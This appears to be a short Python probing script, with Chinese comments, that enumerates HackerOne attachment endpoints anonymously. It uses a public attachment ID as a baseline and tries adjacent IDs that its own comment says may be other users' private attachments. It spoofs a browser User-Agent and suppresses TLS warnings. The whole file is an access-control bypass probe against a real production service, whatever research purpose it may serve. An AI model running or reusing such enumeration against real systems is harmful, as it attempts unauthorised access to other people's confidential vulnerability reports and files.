# -*- coding: utf-8 -*-
"""h1x31: attachment id 直取端点探测(匿名;6563329=公开报告附件,相邻=别人附件)"""
import sys, io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
import requests, urllib3
urllib3.disable_warnings()

s = requests.Session()
s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36'})

# id 候选:6563329(公开,基线)+ 6563328/6563333(相邻,可能别人私有)
paths = [
    '/attachments/{}',
    '/attachments/{}.json',
    '/reports/3973228/attachments/{}',
    '/report_attachments/{}',
    '/attachments/{}/download',
]
for p in paths:
    for aid in ['6563329', '6563328', '6563333']:
        url = 'https://hackerone.com' + p.format(aid)
        try:
            r = s.get(url, timeout=15, allow_redirects=False)
            ct = r.headers.get('content-type', '')
            cl = r.headers.get('content-length', '')
            loc = r.headers.get('location', '')
            print(f'[{r.status_code}] {url} ct={ct[:35]} len={cl} loc={loc[:80]}')
        except Exception as e:
            print(f'[ERR] {url} {e}')
    print()
